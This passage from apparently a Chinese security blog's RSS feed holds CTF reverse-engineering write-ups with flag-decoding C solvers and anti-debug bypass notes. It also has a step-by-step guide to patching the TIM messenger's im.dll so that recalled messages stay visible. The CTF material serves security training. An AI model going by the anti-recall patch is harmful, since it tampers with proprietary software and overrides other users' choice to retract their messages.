class="number">0x146E</span>,<span class="number">0x1470</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x146E</span>,<span class="number">0x147B</span>,<span class="number">0x1476</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x147B</span>,<span class="number">0x1480</span>,<span class="number">0x0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;wcslen(dest);i++)</span><br><span class="line">&#123;</span><br><span class="line">dest[i] -= a[j++];</span><br><span class="line">j=j&lt;<span class="number">5</span>?j:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">wprintf(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:9447{you_are_an_international_mystery}</p></blockquote><hr><h1 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h1><p>题目描述：听说运行就能拿到Flag，不过菜鸡运行的结果不知道为什么是乱码</p><p><img src="https://i.loli.net/2020/04/08/gOS5MawTtPnrDGl.png" alt=""></p><p><img src="https://i.loli.net/2020/04/08/36pjo2lhmObzUSH.png" alt=""></p><p><img src="https://i.loli.net/2020/04/08/HEZ6abTsUONh3n8.png" alt=""></p><p>走一下他的解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">"惶牸苎靖拖井夷珎屹摮赞摡铀競铀竟氉梯"</span>;</span><br><span class="line"><span class="keyword">int</span> v2=<span class="number">0xDDCCAABB</span>;</span><br><span class="line"><span class="keyword">int</span> len=<span class="built_in">strlen</span>(key)/<span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">*(<span class="keyword">int</span> *)(key+<span class="number">4</span>*i)^=v2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,key+<span class="number">1</span>);<span class="comment">//由于第一个转换出来是0所以跳过 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h1><p>这个问题牵扯到了一类题,迷宫型问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) != <span class="number">24</span> || <span class="built_in">strncmp</span>(&amp;s1, <span class="string">"nctf&#123;"</span>, <span class="number">5u</span>LL) || *(&amp;byte_6010BF + <span class="number">24</span>) != <span class="string">'&#125;'</span> )</span><br></pre></td></tr></table></figure><p>这一句说明flag长24且由nctf{}包起来,然后看见了一个字符串,把他空格替换成X然后换下行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">XX******</span><br><span class="line">*XXX*XX*</span><br><span class="line">***X*X**</span><br><span class="line">**XX*X**</span><br><span class="line">*XX*#XX*</span><br><span class="line">**X***X*</span><br><span class="line">**XXXXX*</span><br><span class="line">********</span><br></pre></td></tr></table></figure><p>xy初始为零,那么路线就是→↓→→↓↓←↓↓↓→→→→↑↑←←</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">  v3 = <span class="number">5L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;input) - <span class="number">1</span> &gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      operation = *(&amp;input + v3);               <span class="comment">// v3=5</span></span><br><span class="line">      operation_result_ = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( operation &gt; <span class="number">78</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( operation == <span class="string">'O'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          operation_result = left(&amp;x);</span><br><span class="line">          <span class="keyword">goto</span> cheak;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( operation == <span class="string">'o'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          operation_result = right(&amp;x);</span><br><span class="line">          <span class="keyword">goto</span> cheak;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( operation == <span class="string">'.'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          operation_result = up(&amp;y);</span><br><span class="line">          <span class="keyword">goto</span> cheak;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( operation == <span class="string">'0'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          operation_result = down(&amp;y);</span><br><span class="line">cheak:</span><br><span class="line">          operation_result_ = operation_result;</span><br><span class="line">          <span class="keyword">goto</span> cheak__;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">cheak__:</span><br><span class="line">      <span class="keyword">if</span> ( !cheak(maze, x, y) )                 <span class="comment">// 等于' '||'#'返回1</span></span><br><span class="line">        <span class="keyword">goto</span> wrong_;                            <span class="comment">// 前面的xy是由cheak函数看出来的</span></span><br><span class="line">      <span class="keyword">if</span> ( ++v3 &gt;= <span class="built_in">strlen</span>(&amp;input) - <span class="number">1</span> )         <span class="comment">// 如果到尾了就走出循环</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( operation_result_ )                <span class="comment">// 如果上下左右之后的位置没有出错就进入下一个</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">wrong__:</span><br><span class="line">        result = <span class="string">"Wrong flag!"</span>;</span><br><span class="line">        <span class="keyword">goto</span> wrong___;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( maze[<span class="number">8</span> * y + x] != <span class="string">'#'</span> )                 <span class="comment">// 如果走到尾了还不是'#'就wrong!</span></span><br><span class="line">    <span class="keyword">goto</span> wrong__;</span><br><span class="line">  result = <span class="string">"Congratulations!"</span>;</span><br><span class="line">wrong___:</span><br><span class="line">  <span class="built_in">puts</span>(result);</span><br></pre></td></tr></table></figure><p>所以</p><blockquote><p>flag:nctf{o0oo00O000oooo..OO}</p></blockquote><hr><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>到此xctf新手区就完毕啦,虽然写过了,现在再来写还是能够学到东西呢,以前做题太浮夸浮躁了,那些工具用的也不是很熟,现在感觉超棒滴,不过离师傅们我还差的远呐,师傅们都在想转pwn的事情了,慢慢来吧,共勉!</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/04/15/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>实现t某x程序的防撤回</title>
      <link>https://usher2008.github.io/2020/04/10/%E5%AE%9E%E7%8E%B0t%E6%9F%90x%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%98%B2%E6%92%A4%E5%9B%9E/</link>
      <guid>https://usher2008.github.io/2020/04/10/%E5%AE%9E%E7%8E%B0t%E6%9F%90x%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%98%B2%E6%92%A4%E5%9B%9E/</guid>
      <pubDate>Fri, 10 Apr 2020 04:18:58 GMT</pubDate>
      <description>
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
本文章仅供学习,请勿用于违法犯罪!
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>本文章仅供学习,请勿用于违法犯罪!<a id="more"></a></blockquote><h1 id="修改过程"><a href="#修改过程" class="headerlink" title="修改过程"></a>修改过程</h1><ol><li><p>用x32dbg附加ti(防和谐)m.exe</p></li><li><p>符号搜索im.dll,双击点进去</p></li><li><p>右键 搜索-&gt;当前区域-&gt;字符串引用</p></li><li><p>搜索完之后在搜索结果里搜索<code>bytes_reserved</code>,应该会有几个,找到类似这种结构的,再作如下修改,这是私聊的防撤回<img src="https://ae01.alicdn.com/kf/Hb147a448cad74c09b384967a1b8a2bb7e.png" alt=""></p></li><li><p>群聊的在修改完以后搜索<code>bytes_userdef</code>,也会有几个,在找到类似这种结构的,并修改<img src="https://ae01.alicdn.com/kf/Hbc79303e90344719882cb739ac067379p.png" alt=""></p></li><li><p>最后右键 补丁-&gt;补丁文件,名字先改为另一个非im.dll的,保存好之后把x32dbg关掉,在去tim的目录,把im.dll删掉以及把另一个改好的改成im.dll</p></li><li><p>重新上以后就发现实现了防撤回</p></li></ol><p><img src="https://ae01.alicdn.com/kf/H8da02a7a99d246eb8e15f77f6375a2c9w.png" alt="手机视角"></p><p><img src="https://ae01.alicdn.com/kf/H041af72d08094adca3063eb0a68171c3T.png" alt="电脑视角"></p><h1 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h1><ol><li>q(防和谐)q同理</li><li>jmp的是哪个test的地址,不一定一定相同</li><li>如果无效可以多试几次,也许有几个一样的结构</li><li>可以提前备份一下原文件以免…</li></ol><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>原理是前辈以前在ti(防和谐)m的目录(亦或者是q(防和谐)q的目录)里面搜索与撤回相关的字符串,后面定位到了im.dll这个文件所以我们可以直接找到这个dll,当然字符串也是前辈找到的,咱只管用</p><p>另外就是中间跳过的那个call估计就是执行撤回消息的call了</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/04/10/%E5%AE%9E%E7%8E%B0t%E6%9F%90x%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%98%B2%E6%92%A4%E5%9B%9E/#disqus_thread</comments>
    </item>
    
    <item>
      <title>auctf</title>
      <link>https://usher2008.github.io/2020/04/06/auctf/</link>
      <guid>https://usher2008.github.io/2020/04/06/auctf/</guid>
      <pubDate>Mon, 06 Apr 2020 11:38:58 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
starts 4/3/2020 at 8:00 AM CST and ends 4/5/2020 at 11:00 PM CST
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>starts 4/3/2020 at 8:00 AM CST and ends 4/5/2020 at 11:00 PM CST<a id="more"></a></blockquote><h1 id="ti-83-beta"><a href="#ti-83-beta" class="headerlink" title="ti_83_beta"></a>ti_83_beta</h1><p>这个题本来没有一点头绪,后来在里面字符串看见两个不一样的字符串,<strong>merr</strong> <strong>derr</strong>,输入之后会出现<strong>under construction</strong>,觉得这句很可疑,去交叉引用看了一下,看见了一个<strong>atoi</strong>,是把字符串转换成整型数的一个函数,尝试输入之后,flag蹦出来了。。。</p><p>看了wp发现不是这么回事,merr是整数乘法,derr是整数除法,前面用div除法是浮点数所以可以除0,但是整数除0不行,这个程序作者把flag放在了除零异常里,在里面有一点点混淆处理,OD走异常走不过去,用IDA就可以了</p><p><img src="https://ae01.alicdn.com/kf/Hc88c9776b48d4833a7b144711f5b3ddfB.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/H7e4fad10b65d4467b9bb49f71d1a33104.png" alt=""></p><blockquote><p>flag:auctf{oops_did_i_do_tht}</p></blockquote><hr><h1 id="dont-break-me"><a href="#dont-break-me" class="headerlink" title="dont_break_me_"></a>dont_break_me_</h1><p><img src="https://ae01.alicdn.com/kf/H8e0ff946e0b54698a4f18e5ef2475956f.png" alt=""></p><p>首先看到了反debug 这个好操作点进那个call,直接修补ret就好了</p><p><img src="https://ae01.alicdn.com/kf/H8c45d7bb0a28446fbeceb953f955a1b2L.png" alt=""></p><p>贴一下encrypet</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">strlen</span>(s) &gt; i; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( s[i] == <span class="string">' '</span> )</span><br><span class="line">    v5[i] = s[i];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5[i] = (a2 * (s[i] - <span class="number">65</span>) + a3) % <span class="number">26</span> + <span class="number">65</span>;<span class="comment">//这个%表明不能从这里解密</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v5;</span><br></pre></td></tr></table></figure><p>main的分析到此为止了,那么只能去看别的地方了</p><p>然后就发现了一个奇怪的call,为什么呢,因为没有被引用到</p><p><img src="https://ae01.alicdn.com/kf/H7e5defde8ca74196acf26df3b47806bcz.png" alt=""></p><p>里面还有个<strong>inverse</strong> 贴一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( i * a1 % <span class="number">26</span> == <span class="number">1</span> )</span><br><span class="line">    v3 = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v3;</span><br></pre></td></tr></table></figure><p>然后把这里的解密带进去发现出现了明文 <strong>IKILLWITHMYHEART</strong></p><p>然后开开心心的去服务器上的程序交,开开心心的得到了flag</p><p>贴一下exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">"SASRRWSXBIEBCMPX"</span>;<span class="comment">//这是动态内存里找到的key </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v3;</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i * <span class="number">17</span> % <span class="number">26</span> == <span class="number">1</span> )</span><br><span class="line">      v3 = i;</span><br><span class="line">  &#125;<span class="comment">//这是inverse </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;key[i];i++)</span><br><span class="line">key[i] = v3* (key[i]+<span class="number">65</span><span class="number">-12</span>)% <span class="number">26</span> + <span class="number">65</span> ;<span class="comment">//decrypt直接照抄 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,key);</span><br><span class="line"><span class="comment">//auctf&#123;static_or_dyn@mIc?_12923&#125;</span></span><br><span class="line"> &#125; <span class="comment">//a2=17 a3=12</span></span><br></pre></td></tr></table></figure><blockquote><p>flag:auctf{static_or_dyn@mIc?_12923}</p></blockquote><hr><h1 id="chestburster"><a href="#chestburster" class="headerlink" title="chestburster"></a>chestburster</h1><p>这道题目输入假码后跟踪发现把假码换位置之后,把假码换了个位置,再去与<strong>welcome_to_the_jungle!</strong>比较,那么把这个字符串按他换位置的顺序换一下就可以得到key了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[]=<span class="string">"welcome_to_the_jungle!"</span>;</span><br><span class="line"><span class="keyword">char</span> b[]=&#123;<span class="number">5</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">20</span>,<span class="number">19</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">15</span>,<span class="number">18</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">22</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[b[i]] = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line"> &#125; <span class="comment">//lmo_ewce_j!eo_tulgneht</span></span><br></pre></td></tr></table></figure><p>然而事情并没有这么简单,连上服务器交了以后让我去另一个地方</p><p><img src="https://ae01.alicdn.com/kf/H21db5df04c4447c48852ccfda937904bi.png" alt=""></p><p>结果这个地方啥也找不到</p><p><img src="https://ae01.alicdn.com/kf/H7087583bdc544a0e86eaed187cb24e09J.png" alt=""></p><p>然后到这里就没得了思路</p><p>好了现在看了wp,简单讲讲吧</p><p><img src="https://ae01.alicdn.com/kf/H1906f751446b4b569583133979f13d3aL.png" alt=""></p><p>如wp所说,用<strong>binwalk</strong>发现里面有两个PE,再用<strong>winhex</strong>把9392后面的全部复制到一个新的文件,然后cmd打开提示输入IP和PORT,这个就是输入<strong>challenges.suctf.com:30009</strong>,然后再用<strong>Wireshark</strong>分析该文件与网址端口的交互就可以了,就可以了,就可以了.</p><hr><h1 id="cracker-barrel"><a href="#cracker-barrel" class="headerlink" title="cracker_barrel"></a>cracker_barrel</h1><p>这个题,题目标的很清晰了</p><p><img src="https://ae01.alicdn.com/kf/Ha5d0c677bee441988069521f6c422d14P.png" alt=""></p><p>check里面check_1,check_2,check_3</p><p><img src="https://ae01.alicdn.com/kf/H90f9f0f7d4b0452a9f15fc349ad03616w.png" alt="cheak_1"></p><p>check_2就一句话</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(i + input) = key_[v3 - <span class="number">1</span> - i];</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Hf6a97d0accad4fa69d36cbab6c446f365.png" alt="cheeck_3"></p><p>前面还有个key是直接在内存里面找的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key1[]=<span class="string">"si siht egassem terces"</span>;</span><br><span class="line"><span class="keyword">char</span> flag1[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">22</span>;i++)</span><br><span class="line">flag1[i]=key1[<span class="number">22</span><span class="number">-1</span>-i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,flag1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag2[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> key2[]=<span class="string">"z!!b6~wn&amp;`"</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag2[i] = (key2[i]^<span class="number">0x14</span>)<span class="number">-2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag2);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>starwars</p><p>secret message this is</p><p>l33t hax0r</p></blockquote><p>flag我没得,做完得时候服务器关了</p><h1 id="sora"><a href="#sora" class="headerlink" title="sora"></a>sora</h1><p>这个题结构十分清晰</p><p><img src="https://ae01.alicdn.com/kf/Hfa450915cca64e0a8ab23016f6f20818f.png" alt=""></p><p>encrypt也很简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="number">8</span> * *(i + a1) + <span class="number">19</span>) % <span class="number">61</span> + <span class="number">65</span> != secret[i] )</span><br></pre></td></tr></table></figure><p>从secret反推是不行的</p><p>那就正推</p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">"aQLpavpKQcCVpfcg"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;key[i];i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="string">' '</span>;j&lt;<span class="string">'&#125;'</span>;j++)</span><br><span class="line"><span class="keyword">if</span>(((<span class="number">8</span>*j+<span class="number">0x13</span>)%<span class="number">0x3D</span>)+<span class="number">65</span>==key[i])</span><br><span class="line">&#123;</span><br><span class="line">flag[i]=j;</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//开始没有break出现奇怪的东西</span></span><br><span class="line">&#125;<span class="comment">//"我们要相信IDA"自己的问题不要甩给IDA~</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>75&lt;”72”%5($.”0(</p></blockquote><p>flag忘记了,反正也没啥用</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/04/06/auctf/#disqus_thread</comments>
    </item>
    
    <item>
      <title>merak-ctf 3/27 18:00 - 3/29 22:00</title>
      <link>https://usher2008.github.io/2020/04/01/merak-ctf/</link>
      <guid>https://usher2008.github.io/2020/04/01/merak-ctf/</guid>
      <pubDate>Wed, 01 Apr 2020 11:38:58 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
前言:一个萌新re的wp
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>前言:一个萌新re的wp<a id="more"></a></blockquote><h1 id="PixelShooter"><a href="#PixelShooter" class="headerlink" title="PixelShooter"></a>PixelShooter</h1><p>这个题最简单了，GG修改分数死了就直接出flag</p><img src="https://i.loli.net/2020/03/30/YwNUtG42W75Ooim.png" alt="" style="zoom: 50%;" /><blockquote><p>flag:MRCTF{Unity_1S_Fun_233}</p></blockquote><p>因为没有接触过安卓逆向,大佬都是直接把APK丢进反编译软件里的,只能用这种费力的方式了</p><p><a href="https://buuoj.cn/files/bf4eab9720bda30c2da2585a906b1683/attachment.zip?token=eyJ1c2VyX2lkIjo3NzEyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxNzcwfQ.XohQ7A.UdbCZCda_BQAh1e_m9bFi0WrhJ0" target="_blank" rel="noopener">该题官方下载链接</a></p><hr><h1 id="lualu"><a href="#lualu" class="headerlink" title="lualu"></a>lualu</h1><p>这个题先翻了一下脚本发现看不懂,所以在线重写一遍</p><p>直接丢进IDA,提示用IDA64,那就是64位程序了</p><p>丢进IDA64加载完后翻了一下,卧槽居然没有main</p><img src="https://i.loli.net/2020/03/30/jdm3UDTXrRak9Lx.png" alt="" style="zoom: 80%;" /><p>不过不急shift+F12,顺便打开程序看一下</p><p><img src="https://i.loli.net/2020/03/30/SEuwhPYseqJ8Fox.png" alt=""></p><p>ctrl+F搜到了那个字符串</p><img src="https://i.loli.net/2020/03/30/arodpkbVnS7jRZD.png" alt=""  /><p>双击点进去,并按x查看引用</p><p><img src="https://i.loli.net/2020/03/30/8fEX4LlkJYRy2bq.png" alt=""></p><p>看到了这些汇编,不过咱也看不懂还是直接F5</p><p><img src="https://i.loli.net/2020/03/30/IB8qzJMPde3Cvah.png" alt=""></p><p>一顿操作以后</p><img src="https://i.loli.net/2020/03/30/uHoWeK4OFpL5biQ.png" alt="" style="zoom: 80%;" /><p>这咋办呐,不急我们走动态看看</p><img src="https://i.loli.net/2020/03/30/daPbFEi6g8UGL7f.png" alt="" style="zoom:80%;" /><p>一样的做法先搜索字符串,定位关键代码</p><img src="https://i.loli.net/2020/03/30/ybmiPuQnZNUfE9W.png" alt="" style="zoom:80%;" /><p>本来想找他的scanf,然后跟自己输入的假码,在他上面说的字符串之后下了断点,结果就发现了这个,分析如下</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cmps=&#123;<span class="number">83</span>,<span class="number">80</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">76</span>,<span class="number">125</span>,<span class="number">61</span>,<span class="number">96</span>,<span class="number">107</span>,<span class="number">85</span>,<span class="number">62</span>,<span class="number">63</span>,<span 